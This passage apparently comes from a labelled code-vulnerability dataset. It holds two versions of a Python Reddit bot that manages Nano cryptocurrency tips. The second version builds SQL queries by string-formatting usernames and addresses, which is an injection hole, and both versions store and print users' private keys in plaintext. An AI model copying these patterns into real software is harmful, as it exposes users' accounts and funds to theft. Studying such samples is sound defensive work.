Nano\\n\n*Nano Tipper Z V0.1. This program is in early beta testing, please use with caution. Funds are not safe.*\n\"\"\"\n\nhelp_text = \"\"\"\nNano Tipper Z Bot v0.1. Use at your own risk, and don't put in more Nano than you're willing to lose.\\n\\n\nTo perform a command, create a new message with any of the following commands in the message body.\\n\\n\n'create' - Create a new account if one does not exist\\n\\n\n'private_key' -  (disabled) Retrieve your account private key\\n\\n\n'new_address' - (disabled) If you feel this address was compromised, create a new account and key\\n\\n\n'send <amount> <user/address> - Send Nano to a reddit user or an address\\n\\n\n'receive' - Receive all pending transactions\\n\\n\n'balance' - Retrieve your account balance. Includes both pocketed and unpocketed transactions.\\n\\n\n'minimum <amount>' - Sets a minimum amount for receiving tips. Program minimum is 0.001 Nano.\\n\\n\n'help' - Get this help message\\n\\n\\n\nIf you have any questions or bug fixes, please contact /u/zily88.\n\"\"\" + \"\"\"\\n\"\"\" + comment_footer\nreddit = praw.Reddit('bot1')\n#submission = reddit.submission(id='39zje0')\n#print(submission.title) # to make it non-lazy\n#print(submission.created)\n#print(datetime.utcfromtimestamp(submission.created_utc).strftime('%Y-%m-%d %H:%M:%S'))\n#pprint.pprint(vars(submission))\n\nsubreddit = reddit.subreddit(\"nano_tipper_z+cryptocurrency247\")\n\ntip_froms = []\ntip_parents = []\ntip_tos = []\ntip_comments = []\ntip_amounts = []\nlast_action = time.time()\nprogram_minimum = 0.001\nrecipient_minimum = 0.01\n\nwith open('sql_password.txt') as f:\n    sql_password = f.read()\n\nmydb = mysql.connector.connect(user='root', password=sql_password,\n                              host='localhost',\n                              auth_plugin='mysql_native_password', database='nano_tipper_z')\nmycursor = mydb.cursor()\n\n#generator for our comments. Maybe this wasn't necessary, but I never get to use generators\ndef stream_comments_messages():\n    previous_comments = {comment for comment in subreddit.comments()}\n    previous_messages = {message for message in reddit.inbox.unread()}\n    print('received first stream')\n    while True:\n        sleep(6)\n        global last_action\n        last_action = time.time()\n\n        updated_comments = {comment for comment in subreddit.comments()}\n        new_comments = updated_comments - previous_comments\n        previous_comments = updated_comments\n\n        # check for new messages\n        updated_messages = {message for message in reddit.inbox.unread()}\n        new_messages = updated_messages - previous_messages\n        previous_messages = updated_messages\n\n        # send anything new to our main program\n        # also, check the message type. this will prevent posts from being seen as messages\n        if len(new_comments) >= 1:\n            for new_comment in new_comments:\n                # if new_comment starts with 't1_'\n                print('full name: ', new_comment.name)\n                if new_comment.name[:3] == 't1_':\n                    yield ('comment', new_comment)\n        if len(new_messages) >= 1:\n            for new_message in new_messages:\n                # if message starts with 't4_'\n                print('full name: ', new_message.name)\n                if new_message.name[:3] == 't4_':\n                    yield ('message', new_message)\n\n        else:\n            yield None\n\n\ndef update_history():\n    return None\n\n\ndef add_history_record(username=None, action=None, sql_time=None, address=None, comment_or_message=None,\n                       recipient_username=None, recipient_address=None, amount=None, hash=None, comment_id=None,\n                       notes=None, reddit_time=None, comment_text=None):\n    if sql_time is None:\n        sql_time = time.strftime('%Y-%m-%d %H:%M:%S')\n\n    sql = \"INSERT INTO history (username, action, sql_time, address, comment_or_message, recipient_username, \" \\\n          \"recipient_address, amount, hash, comment_id, notes, reddit_time, comment_text) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)\"\n\n    val = (username, action, sql_time, address, comment_or_message, recipient_username, recipient_address, amount,\n           hash, comment_id, notes, reddit_time, comment_text)\n\n    mycursor.execute(sql, val)\n    mydb.commit()\n    return mycursor.lastrowid\n\n\ndef check_registered_by_address(address):\n    address = address.split('_')[1]\n\n    sql = \"SELECT username FROM accounts WHERE address='%s'\"\n    val = ('xrb_' + address, )\n    mycursor.execute(sql, val)\n    result = mycursor.fetchall()\n    if len(result) > 0:\n        return result[0][0]\n\n    sql = \"SELECT username FROM accounts WHERE address='%s'\"\n    val = ('nano_' + address, )\n    mycursor.execute(sql, val)\n    result = mycursor.fetchall()\n    if len(result) > 0:\n        return result[0][0]\n\n    return None\n\n#updated\ndef add_new_account(username):\n    address = generate_account()\n    private = address['private']\n    address = address['account']\n    print(type(private), type(address), type(username))\n    print(private, address, username)\n    sql = \"INSERT INTO accounts (username, private_key, address, minimum) VALUES (%s, %s, %s, %s)\"\n    val = (username, private, address, nano_to_raw(0.01))\n    mycursor.execute(sql, val)\n    mydb.commit()\n    return address\n\n\ndef handle_create(message):\n    message_time = datetime.utcfromtimestamp(message.created_utc)  # time the reddit message was created\n    add_history_record(\n        username=str(message.author),\n        comment_or_message='message',\n        reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),\n        action='create',\n        comment_text=str(message.body)[:255]\n    )\n\n    username = str(message.author)\n    sql = \"SELECT address FROM accounts WHERE username=%s\"\n    val = (username, )\n    mycursor.execute(sql, val)\n    result = mycursor.fetchall()\n    if len(result) is 0:\n        address = add_new_account(username)\n        response = \"Hi! I have created a new account for you. Your Nano address is %s. Once Nano is sent to your new account,\" \\\n                   \" your balance will be\" \\\n                   \" unpocketed until you respond and have 'receive' in the message body.\\n\\nhttps://www.nanode.co/account/%s\" % (address, address)\n    else:\n        response = \"It looks like you already have an account made. Your Nano address is %s. Once Nano is sent to your account, your balance will be\" \\\n                 \" unpocketed until you respond and have 'receive' in the message body.\\n\\nhttps://www.nanode.co/account/%s\" % (result[0][0], result[0][0])\n    x = reddit.redditor(username).message('Nano Tipper Z: Account Creation', response + comment_footer)\n    # message.reply(response)\n\n\n# currently deactivated\ndef handle_private_key(message):\n    author = str(message.author)\n    message_time = datetime.utcfromtimestamp(message.created_utc)  # time the reddit message was created\n    add_history_record(\n        username=str(message.author),\n        comment_or_message='message',\n        reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),\n        action='private_key',\n        comment_text=str(message.body)[:255]\n    )\n    sql = \"SELECT address, private_key FROM accounts WHERE name='%s'\"\n    val = (author, )\n    mycursor.execute(sql, val)\n    result = mycursor.fetchall()\n    if len(result) > 0:\n        response = 'Your account: %s\\n\\nYour private key: %s'%(result[0][0],result[0][1])\n        x = reddit.redditor(username).message('New Private Key', response)\n        return None\n    else:\n        x = reddit.redditor(username).message(\"No account found.\",\"You do not currently have an account open.\"\n                                                                \"To create one, respond with the text 'create' in the message body.\")\n        return None\n\n\n#updated\ndef handle_balance(message):\n    username = str(message.author)\n    message_time = datetime.utcfromtimestamp(message.created_utc)  # time the reddit message was created\n    add_history_record(\n        username=str(message.author),\n        comment_or_message='message',\n        reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),\n        action='balance',\n        comment_text=str(message.body)[:255]\n    )\n    sql = \"SELECT address FROM accounts WHERE username=%s\"\n    val = (username, )\n    mycursor.execute(sql, val)\n    result = mycursor.fetchall()\n    if len(result)>0:\n        results = check_balance(result[0][0])\n\n        response = \"At address %s, you currently have %s Nano available, and %s Nano unpocketed. To pocket any, create a new \" \\\n                   \"message containing the word 'receive'\\n\\nhttps://www.nanode.co/account/%s\" % (result[0][0], results[0]/10**30, results[1]/10**30, result[0][0])\n        reddit.redditor(username).message('Nano Tipper Z account balance', response + comment_footer)\n        return None\n\n    reddit.redditor(username).message('Nano Tipper Z: No account registered.', 'You do not have an open account yet' + comment_footer)\n\n# currently deactivated\ndef handle_new_address(message):\n    message_time = datetime.utcfromtimestamp(message.created_utc)  # time the reddit message was created\n    add_history_record(\n        username=str(message.author),\n        comment_or_message='message',\n        action='new_address',\n        reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),\n        comment_text=str(message.body)[:255]\n    )\n    message.reply('not activated yet.')\n\n\n#updated\ndef handle_send(message):\n    parsed_text = str(message.body).lower().replace('\\\\', '').split('\\n')[0].split(' ')\n    response = handle_send_nano(message, parsed_text, 'message')\n    message.reply(response + comment_footer)\n\n\n#updated\ndef handle_send_nano(message, parsed_text, comment_or_message):\n    user_or_address = '' # either 'user' or 'address', depending on how the recipient was specified\n    private_key = ''\n    adrress = ''\n    recipient = ''\n    recipient_username = ''\n    recipient_address = ''\n    message_time = datetime.utcfromtimestamp(message.created_utc) # time the reddit message was created\n    username = str(message.author) # the sender\n\n    entry_id = add_history_record(\n        username=username,\n        action='send',\n        comment_or_message=comment_or_message,\n        comment_id=message.id,\n        reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),\n        comment_text=str(message.body)[:255]\n        )\n\n    # check if the message body was parsed into 2 or 3 words. If it wasn't, update the history db\n    # with a failure and return the message. If the length is 2 (meaning recipient is parent author) we will\n    # check that after tip amounts to limit API requests\n    if len(parsed_text) >= 3:\n        amount = parsed_text[1]\n        recipient = parsed_text[2]\n    elif len(parsed_text) == 2:\n        # parse the user info in a later block of code to minimize API requests\n        pass\n    else:\n        sql = \"UPDATE history SET notes = %s WHERE id = %s\"\n        val = ('could not find tip amount', entry_id)\n        mycursor.execute(sql, val)\n        mydb.commit()\n        return 'Could not read your tip or send command, or find an amount. Be sure the amount and recipient are separated by a space.'\n\n\n    # check that the tip amount is a number, and if it is high enough\n    # we will also check if the tip amount is above the user minimum after we get user information\n    if parsed_text[1].lower() == 'nan' or ('inf' in parsed_text[1].lower()):\n        sql = \"UPDATE history SET notes = %s WHERE id = %s\"\n        val = ('could not parse amount', entry_id)\n        mycursor.execute(sql, val)\n        mydb.commit()\n        return \"Could not read your tip or send amount. Is '%s' a number?\" % parsed_text[1]\n\n    try:\n        amount = float(parsed_text[1])\n    except:\n        sql = \"UPDATE history SET notes = %s WHERE id = %s\"\n        val = ('could not parse amount', entry_id)\n        mycursor.execute(sql, val)\n        mydb.commit()\n        return \"Could not read your tip or send amount. Is '%s' a number?\" % parsed_text[1]\n\n    if amount < program_minimum:\n        sql = \"UPDATE history SET notes = %s WHERE id = %s\"\n        val = ('amount below program limit', entry_id)\n        mycursor.execute(sql, val)\n        mydb.commit()\n        return 'You must send amounts of Nano above the program limit of %s.' % program_minimum\n\n    # check if author has an account, and if they have enough funds\n    sql = \"SELECT address, private_key FROM accounts WHERE username=%s\"\n    val = (username, )\n    mycursor.execute(sql, val)\n    result = mycursor.fetchall()\n    if len(result) < 1:\n        sql = \"UPDATE history SET notes = %s WHERE id = %s\"\n        val = ('sender does not have an account', entry_id)\n        mycursor.execute(sql, val)\n        mydb.commit()\n\n        return 'You do not have a tip bot account yet. To create one, send me a PM containing the'\\\n               \" text 'create' in the message body, or get a tip from a fellow redditor!.\"\n    else:\n        address = result[0][0]\n        private_key = result[0][1]\n        results = check_balance(result[0][0])\n        if nano_to_raw(amount) > results[0]:\n            sql = \"UPDATE history SET notes = %s WHERE id = %s\"\n            val = ('insufficient funds', entry_id)\n            mycursor.execute(sql, val)\n            mydb.commit()\n            return 'You have insufficient funds. Your account has %s pocketed (+%s unpocketed) and you are '\\\n                          'trying to send %s. If you have unpocketed funds, create a new message containing the text'\\\n                          ' \"receive\" to pocket your incoming money.'%(results[0]/10**30, results[1]/10**30, amount)\n\n    # if there was only the command and the amount, we need to find the recipient.\n    # if it was a comment, the recipient is the parent author\n    # if it was a message, the program will respond with an error\n    if len(parsed_text) == 2:\n        if comment_or_message == 'comment':\n            recipient = str(message.parent().author)\n        else:\n            sql = \"UPDATE history SET notes = %s, WHERE id = %s\"\n            val = (\"no recipient specified\", entry_id)\n            mycursor.execute(sql, val)\n            mydb.commit()\n            return \"You must specify an amount and a user.\"\n\n    # remove the /u/ if a redditor was specified\n    if recipient[:3].lower() == '/u/':\n        recipient = recipient[3:]\n        print(recipient)\n\n    # recipient -- first check if it is a valid address. Otherwise, check if it's a redditor\n    if (recipient[:5].lower() == \"nano_\") or (recipient[:4].lower() == \"xrb_\"):\n        # check valid address\n        success = validate_address(recipient)\n        if success['valid'] == '1':\n            user_or_address = 'address'\n        # if not, check if it is a redditor disguised as an address (e.g. nano_is_awesome, xrb_for_life)\n        else:\n            try:\n                print(getattr(reddit.redditor(recipient), 'is_suspended', False))\n                user_or_address = 'user'\n            except:\n                # not a valid address or a redditor\n                sql = \"UPDATE history SET notes = %s WHERE id = %s\"\n                val = ('invalid address or address-like redditor does not exist', entry_id)\n                mycursor.execute(sql, val)\n                mydb.commit()\n                return '%s is neither a valid address or redditor' % recipient\n    else:\n        try:\n            print(getattr(reddit.redditor(recipient), 'is_suspended', False))\n            user_or_address = 'user'\n        except:\n            sql = \"UPDATE history SET notes = %s WHERE id = %s\"\n            val = ('redditor does not exist', entry_id)\n            mycursor.execute(sql, val)\n            mydb.commit()\n            return \"Could not find redditor %s. Make sure you aren't writing or copy/pasting markdown.\" % recipient\n\n    # at this point:\n    # 'amount' is a valid positive number and above the program minimum\n    # 'username' has a valid account and enough Nano for the tip\n    # 'user_or_address' is either 'user' or 'address',\n    # 'recipient' is either a valid redditor or a valid Nano address\n\n    user_minimum = -1\n    # if a user is specified, reassign that as the username\n    if user_or_address == 'user':\n        #try to get the username information\n        recipient_username = recipient\n        sql = \"SELECT minimum, address FROM accounts WHERE username = %s\"\n        val = (recipient_username,)\n        mycursor.execute(sql, val)\n        myresult = mycursor.fetchall()\n        # if there is a result, pull out the minimum (in raw) and nano address for the recipient\n        if len(myresult) > 0:\n            print(myresult[0])\n            user_minimum = int(myresult[0][0])\n            recipient_address = myresult[0][1]\n    else:\n        # if the recipient is an address, check if they have an account\n        recipient_address = recipient\n        recipient_username = check_registered_by_address(recipient_address)\n        if recipient_username:\n            sql = \"SELECT minimum, address FROM accounts WHERE username = %s\"\n            val = (recipient_username,)\n            mycursor.execute(sql, val)\n            myresult = mycursor.fetchall()\n            print(myresult[0])\n            user_minimum = float(myresult[0][0])\n\n    # if either we had an account or address which has been registered, recipient_address and recipient_username will\n    # have values instead of being ''. We will check the minimum\n    if (user_minimum >= 0) and recipient_address and recipient_username:\n        if nano_to_raw(amount) < user_minimum:\n            sql = \"UPDATE history SET notes = %s WHERE id = %s\"\n            val = (\"below user minimum\", entry_id)\n            mycursor.execute(sql, val)\n            mydb.commit()\n\n            return \"Sorry, the user has set a tip minimum of %s. Your tip of %s is below this amount.\"%(user_minimum/10**30, amount)\n\n        if user_or_address == 'user':\n            notes = \"sent to registered redditor\"\n        else:\n            notes = \"sent to registered address\"\n\n        receiving_new_balance = check_balance(recipient_address)\n        sql = \"UPDATE history SET notes = %s, address = %s, username = %s, recipient_username = %s, recipient_address = %s, amount = %s WHERE id = %s\"\n        val = (notes, address, username, recipient_username, recipient_address, str(nano_to_raw(amount)), entry_id)\n        mycursor.execute(sql, val)\n        mydb.commit()\n        print(\"Sending Nano: \", address, private_key, nano_to_raw(amount), recipient_address, recipient_username)\n        sent = send(address, private_key, nano_to_raw(amount), recipient_address)\n        print(\"Hash: \", sent)\n        sql = \"UPDATE history SET hash = %s WHERE id = %s\"\n        val = (sent['hash'], entry_id)\n        mycursor.execute(sql, val)\n        mydb.commit()\n\n        x = reddit.redditor(recipient_username).message('You just received a new Nano tip!',\n                                                    'You have been tipped %s Nano at your address of %s. Your new account balance will be '\n                                                    '%s received and %s unpocketed.' % (\n                                                    amount, recipient_address, receiving_new_balance[0] / 10 ** 30,\n                                                    (receiving_new_balance[1] / 10 ** 30 + amount)) + comment_footer)\n\n        if user_or_address == 'user':\n            return \"Sent ```%s Nano``` to %s.\\nhttps://www.nanode.co/block/%s\" % (amount, recipient_username, sent['hash'])\n        else:\n            return \"Sent ```%s Nano``` to %s.\\nhttps://www.nanode.co/block/%s\" % (amount, recipient_address, sent['hash'])\n\n    elif recipient_address:\n        # or if we have an address but no account, just send\n        sql = \"UPDATE history SET notes = %s, address = %s, username = %s, recipient_address = %s, amount = %s WHERE id = %s\"\n        val = (\n            'sent to unregistered address', address, username, recipient_address, str(nano_to_raw(amount)), entry_id)\n        mycursor.execute(sql, val)\n        mydb.commit()\n\n        print(\"Sending Unregistered Address: \", address, private_key, nano_to_raw(amount), recipient_address)\n\n        sent = send(address, private_key, nano_to_raw(amount), recipient_address)\n        print(\"Hash: \", sent)\n        sql = \"UPDATE history SET hash = %s WHERE id = %s\"\n        val = (sent['hash'], entry_id)\n        mycursor.execute(sql, val)\n        mydb.commit()\n        return \"Sent ```%s Nano``` to address %s.\\nhttps://www.nanode.co/block/%s\" % (amount, recipient_address, sent['hash'])\n\n    else:\n        # create a new account for redditor\n        recipient_address = add_new_account(recipient_username)\n\n\n        x = reddit. \\\n            redditor(recipient_username). \\\n            message('Congrats on receiving your first Nano Tip!',\n                    'Welcome to Nano Tip Bot! You have just received a Nano tip in the amount of %s at your address '\n                    'of %s. Here is some boilerplate.\\n\\n' % (\n                    amount, recipient_address) + help_text + comment_footer)\n\n        sql = \"UPDATE history SET notes = %s, address = %s, username = %s, recipient_username = %s, recipient_address = %s, amount = %s WHERE id = %s\"\n        val = (\n        \"new user created\", address, username, recipient_username, recipient_address, str(nano_to_raw(amount)), entry_id)\n        mycursor.execute(sql, val)\n        mydb.commit()\n\n        sent = send(address, private_key, nano_to_raw(amount), recipient_address)\n        print(\"Hash: \", sent)\n\n        sql = \"UPDATE history SET hash = %s WHERE id = %s\"\n        val = (sent['hash'], entry_id)\n        mycursor.execute(sql, val)\n        mydb.commit()\n        print(\"Sending New Account Address: \", address, private_key, nano_to_raw(amount), recipient_address, recipient_username)\n        return \"Creating a new account for %s and \"\\\n                      \"sending ```%s Nano```.\\nhttps://www.nanode.co/block/%s\" % (recipient_username, amount, sent['hash'])\n\n\ndef handle_receive(message):\n    message_time = datetime.utcfromtimestamp(message.created_utc)\n    username = str(message.author)\n    # find any accounts associated with the redditor\n    sql = \"SELECT address, private_key FROM accounts WHERE username=%s\"\n    val = (username, )\n    mycursor.execute(sql, val)\n    result = mycursor.fetchall()\n    if len(result) > 0:\n        address = result[0][0]\n        open_or_receive(address, result[0][1])\n        balance = check_balance(address)\n        add_history_record(\n            username=username,\n            action='receive',\n            reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),\n            address=address,\n            comment_or_message='message'\n        )\n        response = \"At address %s, you currently have %s Nano available, and %s Nano unpocketed. To pocket any, create a new \" \\\n                   \"message containing the word 'receive'\\n\\nhttps://www.nanode.co/account/%s\" % (\n                   address, balance[0] / 10 ** 30, balance[1] / 10 ** 30, address)\n        message.reply(response + comment_footer)\n    else:\n        add_history_record(\n            username=username,\n            action='receive',\n            reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),\n            comment_or_message='message'\n        )\n        response = \"You do not currently have an account open. To create one, respond with the text 'create' in the message body.\"\n        message.reply(response + comment_footer)\n\n# updated\ndef handle_minimum(message):\n    message_time = datetime.utcfromtimestamp(message.created_utc)  # time the reddit message was created\n    # user may select a minimum tip amount to avoid spamming. Tipbot minimum is 0.001\n    username = str(message.author)\n    # find any accounts associated with the redditor\n    parsed_text = message.body.replace('\\\\', '').split('\\n')[0].split(' ')\n\n    # there should be at least 2 words, a minimum and an amount.\n    if len(parsed_text) < 2:\n        response = \"I couldn't parse your command. I was expecting 'minimum <amount>'. Be sure to check your spacing.\"\n        message.reply(response)\n        return None\n    # check that the minimum is a number\n\n    if parsed_text[1].lower() == 'nan' or ('inf' in parsed_text[1].lower()):\n        response = \"'%s' didn't look like a number to me. If it is blank, there might be extra spaces in the command.\"\n        message.reply(response)\n    try:\n        amount = float(parsed_text[1])\n    except:\n        response = \"'%s' didn't look like a number to me. If it is blank, there might be extra spaces in the command.\"\n        message.reply(response)\n\n    # check that it's greater than 0.01\n    if nano_to_raw(amount) < nano_to_raw(0.01):\n        response = \"The overall tip minimum is 0.01 Nano.\"\n        message.reply(response)\n\n    # check if the user is in the database\n    sql = \"SELECT address FROM accounts WHERE username=%s\"\n    val = (username, )\n    mycursor.execute(sql, val)\n    result = mycursor.fetchall()\n    print(result)\n    if len(result) > 0:\n        #open_or_receive(result[0][0], result[0][1])\n        #balance = check_balance(result[0][0])\n        add_history_record(\n            username=username,\n            action='minimum',\n            amount=nano_to_raw(amount),\n            address=result[0][0],\n            comment_or_message='message',\n            reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),\n            comment_text=str(message.body)[:255]\n        )\n        sql = \"UPDATE accounts SET minimum = %s WHERE username = %s\"\n        print(amount)\n        print(nano_to_raw(amount))\n        val = (str(nano_to_raw(amount)), username)\n        print(val)\n        mycursor.execute(sql, val)\n        mydb.commit()\n        response = \"Updating tip minimum to %s\"%amount\n        message.reply(response)\n    else:\n        add_history_record(\n            username=username,\n            action='minimum',\n            reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),\n            amount=nano_to_raw(amount),\n            comment_text=str(message.body)[:255]\n        )\n        response = \"You do not currently have an account open. To create one, respond with the text 'create' in the message body.\"\n        message.reply(response)\n\n\n# updated\ndef handle_help(message):\n    message_time = datetime.utcfromtimestamp(message.created_utc)  # time the reddit message was created\n    add_history_record(\n        username=str(message.author),\n        action='help',\n        comment_or_message='message',\n        reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S')\n        )\n    response = help_text\n    message.reply(response)\n\n\n# updated\ndef handle_comment(message):\n    # remove an annoying extra space that might be in the front\n    if message.body[0] == ' ':\n        parsed_text = str(message.body[1:]).lower().replace('\\\\', '').split('\\n')[0].split(' ')\n    else:\n        parsed_text = str(message.body).lower().replace('\\\\', '').split('\\n')[0].split(' ')\n    print(parsed_text)\n    print(len(parsed_text))\n    response = handle_send_nano(message, parsed_text, 'comment')\n    message.reply(response + comment_footer)\n\n\ndef handle_message(message):\n    message_body = str(message.body).lower()\n    print(\"Body: **\", message_body, \"**\")\n    if message.body[0] == ' ':\n        parsed_text = str(message.body[1:]).lower().replace('\\\\', '').split('\\n')[0].split(' ')\n    else:\n        parsed_text = str(message.body).lower().replace('\\\\', '').split('\\n')[0].split(' ')\n    print(\"Parsed Text:\", parsed_text)\n\n    if parsed_text[0].lower() == 'help':\n        print(\"Helping\")\n        handle_help(message)\n\n    elif parsed_text[0].lower() == 'minimum':\n        print(\"Setting Minimum\")\n        handle_minimum(message)\n\n    elif parsed_text[0].lower() == 'create':\n        print(\"Creating\")\n        handle_create(message)\n\n    elif parsed_text[0].lower() == 'private_key':\n        print(\"private_keying\")\n        # handle_private_key(message)\n\n    elif parsed_text[0].lower() == 'new_address':\n        print(\"new address\")\n        # handle_new_address(message)\n\n    elif parsed_text[0].lower() == 'send':\n        print(\"send via PM\")\n        handle_send(message)\n\n    elif parsed_text[0].lower() == 'receive':\n        print(\"receive\")\n        handle_receive(message)\n\n    elif parsed_text[0].lower() == 'balance':\n        print(\"balance\")\n        handle_balance(message)\n    else:\n        add_history_record(\n            username=str(message.author),\n            comment_text=str(message.body)[:255],\n            comment_or_message='message',\n        )\n\n\n# main loop\nfor action_item in stream_comments_messages():\n    if action_item is None:\n        pass\n        #print('No news.')\n    elif action_item[0] == 'comment':\n        print(time.strftime('%Y-%m-%d %H:%M:%S'))\n        print('Comment: ', action_item[1].author, action_item[1].body[:20])\n        if action_item[1].body[0]==' ':\n            parsed_text = str(action_item[1].body[1:]).lower().replace('\\\\', '').split('\\n')[0].split(' ')\n        else:\n            parsed_text = str(action_item[1].body).lower().replace('\\\\', '').split('\\n')[0].split(' ')\n        print('Parsed comment: ', parsed_text)\n        if parsed_text[0] == r'!nano_tip':\n            print('\\n')\n            print('*****************************************************')\n            print('found an item.')\n            handle_comment(action_item[1])\n\n    elif action_item[0] == 'message':\n        if action_item[1].author == 'nano_tipper_z':\n            pass\n        else:\n            print(time.strftime('%Y-%m-%d %H:%M:%S'))\n            print('A new message was found %s, sent by %s.'%(action_item[1], action_item[1].author ))\n            handle_message(action_item[1])\n\n\n\n/n/n/n", "label": 0}, {"id": "d551cbcf99305f241d3e6f9a8c724789f8ec81b6", "code": "/nano_tipper_z.py/n/nimport praw\r\nimport time\r\nfrom datetime import datetime\r\nfrom time import sleep\r\nfrom rpc_bindings import send, open_account, generate_account, generate_qr, nano_to_raw, receive_all, send_all, \\\r\n    check_balance, validate_address, open_or_receive\r\nimport mysql.connector\r\nimport pprint\r\n\r\ncomment_footer = \"\"\"\r\n\\n\\n*Nano Tipper Z Bot v0.1. Replies to this comment might be treated as PM commands. This program is in beta testing,\r\n and your funds could be lost.*\r\n\"\"\"\r\n\r\nhelp_text = \"\"\"\r\nNano Tipper Z Bot v0.1. Use at your own risk, and don't put in more Nano than you're willing to lose.\\n\\n\r\nTo perform a command, create a new message with any of the following commands in the message body.\\n\\n\r\n'create' - Create a new account if one does not exist\\n\\n\r\n'private_key' -  (disabled) Retrieve your account private key\\n\\n\r\n'new_address' - (disabled) If you feel this address was compromised, create a new account and key\\n\\n\r\n'send <amount> <user/address> - Send Nano to a reddit user or an address\\n\\n\r\n'receive' - Receive all pending transactions\\n\\n\r\n'balance' - Retrieve your account balance. Includes both pocketed and unpocketed transactions.\\n\\n\r\n'minimum <amount>' - Sets a minimum amount for receiving tips. Program minimum is 0.001 Nano.\\n\\n\r\n'help' - Get this help message\\n\\n\\n\r\nIf you have any questions or bug fixes, please contact /u/zily88.\r\n\"\"\"\r\nreddit = praw.Reddit('bot1')\r\n#submission = reddit.submission(id='39zje0')\r\n#print(submission.title) # to make it non-lazy\r\n#print(submission.created)\r\n#print(datetime.utcfromtimestamp(submission.created_utc).strftime('%Y-%m-%d %H:%M:%S'))\r\n#pprint.pprint(vars(submission))\r\n\r\nsubreddit = reddit.subreddit(\"nano_tipper_z+cryptocurrency247\")\r\n\r\ntip_froms = []\r\ntip_parents = []\r\ntip_tos = []\r\ntip_comments = []\r\ntip_amounts = []\r\nlast_action = time.time()\r\nprogram_minimum = 0.001\r\nrecipient_minimum = 0.01\r\n\r\nwith open('sql_password.txt') as f:\r\n    sql_password = f.read()\r\n\r\nmydb = mysql.connector.connect(user='root', password=sql_password,\r\n                              host='localhost',\r\n                              auth_plugin='mysql_native_password', database='nano_tipper_z')\r\nmycursor = mydb.cursor()\r\n\r\n#generator for our comments. Maybe this wasn't necessary, but I never get to use generators\r\ndef stream_comments_messages():\r\n    previous_comments = {comment for comment in subreddit.comments()}\r\n    previous_messages = {message for message in reddit.inbox.unread()}\r\n    print('received first stream')\r\n    while True:\r\n        sleep(6)\r\n        global last_action\r\n        last_action = time.time()\r\n\r\n        updated_comments = {comment for comment in subreddit.comments()}\r\n        new_comments = updated_comments - previous_comments\r\n        previous_comments = updated_comments\r\n\r\n        # check for new messages\r\n        updated_messages = {message for message in reddit.inbox.unread()}\r\n        new_messages = updated_messages - previous_messages\r\n        previous_messages = updated_messages\r\n\r\n        # send anything new to our main program\r\n        # also, check the message type. this will prevent posts from being seen as messages\r\n        if len(new_comments) >= 1:\r\n            for new_comment in new_comments:\r\n                # if new_comment starts with 't1_'\r\n                print('full name: ', new_comment.name)\r\n                if new_comment.name[:3] == 't1_':\r\n                    yield ('comment', new_comment)\r\n        if len(new_messages) >= 1:\r\n            for new_message in new_messages:\r\n                # if message starts with 't4_'\r\n                print('full name: ', new_message.name)\r\n                if new_message.name[:3] == 't4_':\r\n                    yield ('message', new_message)\r\n\r\n        else:\r\n            yield None\r\n\r\n\r\ndef update_history():\r\n    return None\r\n\r\n\r\ndef add_history_record(username=None, action=None, sql_time=None, address=None, comment_or_message=None,\r\n                       recipient_username=None, recipient_address=None, amount=None, hash=None, comment_id=None,\r\n                       notes=None, reddit_time=None, comment_text=None):\r\n    if sql_time is None:\r\n        sql_time = time.strftime('%Y-%m-%d %H:%M:%S')\r\n\r\n    sql = \"INSERT INTO history (username, action, sql_time, address, comment_or_message, recipient_username, \" \\\r\n          \"recipient_address, amount, hash, comment_id, notes, reddit_time, comment_text) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)\"\r\n\r\n    val = (username, action, sql_time, address, comment_or_message, recipient_username, recipient_address, amount,\r\n           hash, comment_id, notes, reddit_time, comment_text)\r\n\r\n    mycursor.execute(sql, val)\r\n    mydb.commit()\r\n    return mycursor.lastrowid\r\n\r\n\r\ndef check_registered_by_address(address):\r\n    address = address.split('_')[1]\r\n    mycursor.execute(\"SELECT username FROM accounts WHERE address='%s'\" % ('xrb_' + address))\r\n    result = mycursor.fetchall()\r\n    if len(result) > 0:\r\n        return result[0][0]\r\n\r\n    mycursor.execute(\"SELECT username FROM accounts WHERE address='%s'\" % ('nano_' + address))\r\n    result = mycursor.fetchall()\r\n    if len(result) > 0:\r\n        return result[0][0]\r\n\r\n    return None\r\n\r\n#updated\r\ndef add_new_account(username):\r\n    address = generate_account()\r\n    private = address['private']\r\n    address = address['account']\r\n    print(type(private), type(address), type(username))\r\n    print(private, address, username)\r\n    sql = \"INSERT INTO accounts (username, private_key, address, minimum) VALUES (%s, %s, %s, %s)\"\r\n    val = (username, private, address, nano_to_raw(0.01))\r\n    mycursor.execute(sql, val)\r\n    mydb.commit()\r\n    return address\r\n\r\n\r\ndef handle_create(message):\r\n    message_time = datetime.utcfromtimestamp(message.created_utc)  # time the reddit message was created\r\n    add_history_record(\r\n        username=str(message.author),\r\n        comment_or_message='message',\r\n        reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),\r\n        action='create',\r\n        comment_text=str(message.body)[:255]\r\n    )\r\n\r\n    username = str(message.author)\r\n    mycursor.execute(\"SELECT address FROM accounts WHERE username='%s'\" % username)\r\n    result = mycursor.fetchall()\r\n    if len(result) is 0:\r\n        address = add_new_account(username)\r\n        response = \"Hi! I have created a new account for you. Your Nano address is %s. Once Nano is sent to your new account,\" \\\r\n                   \" your balance will be\" \\\r\n                   \" unpocketed until you respond and have 'receive' in the message body.\\n\\nhttps://www.nanode.co/account/%s\" % (address, address)\r\n    else:\r\n        response = \"It looks like you already have an account made. Your Nano address is %s. Once Nano is sent to your account, your balance will be\" \\\r\n                 \" unpocketed until you respond and have 'receive' in the message body.\\n\\nhttps://www.nanode.co/account/%s\" % (result[0][0], result[0][0])\r\n    x = reddit.redditor(username).message('Nano Tipper Z: Account Creation', response)\r\n    # message.reply(response)\r\n\r\n\r\n# 